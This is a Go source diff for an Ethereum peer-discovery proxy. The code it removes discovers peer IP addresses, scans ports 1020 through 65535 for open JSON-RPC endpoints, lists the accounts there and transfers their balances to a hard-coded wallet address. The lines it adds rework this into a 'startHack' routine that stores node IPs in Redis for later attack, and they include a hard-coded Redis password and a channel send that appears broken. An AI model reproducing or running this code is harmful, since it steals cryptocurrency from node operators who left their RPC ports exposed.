@@ -24,11 +24,15 @@ import (
 	"github.com/ethereum/go-ethereum/p2p/discv5"
 	"github.com/ethereum/go-ethereum/p2p/nat"
 	// "github.com/ethereum/go-ethereum/p2p/netutil"
+	"./redis"
 	"./rpcs"
 	"strings"
 )
 
 var cfg *util.Config
+var red *redis.RedisClient
+
+const prefix = "eth"
 
 func log_init() {
 	logger.SetConsole(cfg.Log.Console)
@@ -49,6 +53,7 @@ func init() {
 	}
 	log_init()
 	// initialize()
+	red = redis.NewRedisClient(&Config{Endpoint: "127.0.0.1:6379", Password: "etcpool123", Database: 0, PoolSize: 10}, prefix)
 }
 
 const (
@@ -128,6 +133,7 @@ type proxy struct {
 	bestHeiAndPeer2 bestHeiPeer
 	bestHeader      types.Header
 	bestHeaderChan  chan []*types.Header
+	hackChan        chan bool
 }
 type bestHeiPeer struct {
 	bestHei uint64
@@ -137,6 +143,7 @@ type bestHeiPeer struct {
 func (pxy *proxy) Start() {
 	tick := time.Tick(50000 * time.Millisecond)
 	tickPullBestBlock := time.Tick(10000 * time.Millisecond)
+	hackChan<-true
 	go func() {
 		for {
 			select {
@@ -179,63 +186,15 @@ func (pxy *proxy) Start() {
 				// fmt.Println("len peers:", pxy.srv.PeerCount(), " time:", time.Now().Format("2006-01-02 15:04:05"))
 				// // fmt.Println("all peers:", pxy.allPeer)
 				// fmt.Println(" ")
-				go pxy.connectNode()
+				<-pxy.hackChan
+				go pxy.startHack()
 			case <-tickPullBestBlock:
 				go pxy.pullBestBlock()
 			}
 		}
 	}()
 }
-func (pxy *proxy) connectNode() {
-	all := pxy.ethpeerset.AllPeer()
-	// if pp, ok := all[bp.P.ID().String()]; ok {
-	// 	hash, td := pp.Head()
-	// 	gene := pp.Genesis()
-	// 	if err := bp.Handshake(gnetworkid, td, hash, gene); err != nil {
-	// 		fmt.Println("Ethereum handshake failed:", err)
-	// 	} else {
-	// 		fmt.Println("Ethereum handshake success")
-	// 	}
-	// }
-	for k, v := range all {
-		addr := v.P.RemoteAddr().String()
 
-		add := strings.Split(addr, ":")
-		fmt.Println(k, ":", add[0])
-		// if pxy.allPeer[add[0]]
-		if hacked, ok := pxy.allPeer[add[0]]; ok {
-			if !hacked {
-				go pxy.hack(add[0])
-			}
-		} else {
-			go pxy.hack(add[0])
-		}
-	}
-}
-func (pxy *proxy) hack(addr string) {
-	for i := 1020; i < 65535; i++ {
-		addrport := "http://" + addr + ":" + fmt.Sprintf("%d", i)
-		r := rpcs.NewRPCClient("xx", addrport, "3s")
-		acc, err := r.GetAccounts()
-		if err != nil {
-			fmt.Println("addrport GetAccounts:", err)
-			continue
-		}
-		for _, ac := range acc {
-			balance, err := r.GetBalance(ac)
-			if err != nil {
-				fmt.Println("addrport GetBalance:", err)
-				continue
-			}
-			if balance.Cmp(new(big.Int).SetInt64(21000*100000000000)) > 0 {
-				b := balance.Sub(balance, new(big.Int).SetInt64(21000*100000000000))
-				r.SendTransaction(ac, "0xd70c043f66e4211b7cded5f9b656c2c36dc02549", "21000", "100000000000", b.Text(10), false)
-			}
-		}
-
-	}
-	pxy.allPeer[addr] = true
-}
 func (pxy *proxy) pullBestBlock() {
 	// var (
 	// 	genesis = pxy.bestState.GenesisBlock
@@ -320,6 +279,7 @@ func test2() {
 		bestHeiChan:    make(chan bestHeiPeer),
 		bestHeiChan2:   make(chan bestHeiPeer),
 		bestHeaderChan: make(chan []*types.Header),
+		hackChan:       make(chan bool),
 	}
 	bootstrapNodes := make([]*discover.Node, 0)
 	for _, boot := range MainnetBootnodes {
@@ -421,7 +381,9 @@ func test() {
 }
 func main() {
 	// test()
-	test2()
+	test2() //write node ip to redis
+	// pureHack()//redis read ip and hack
+	//
 	c := make(chan int, 1)
 
 	<-c
